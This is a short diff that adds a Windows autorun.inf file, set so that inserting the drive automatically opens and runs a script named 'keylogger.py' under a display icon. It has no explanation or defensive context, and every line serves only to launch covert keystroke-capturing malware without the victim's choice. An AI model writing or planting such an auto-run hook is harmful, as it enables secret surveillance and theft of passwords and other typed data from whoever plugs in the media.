@@ -1,0 +1,4 @@
+[autorun]
+open=keylogger.py
+action=Run keylogger.py
+icon=icon.ico
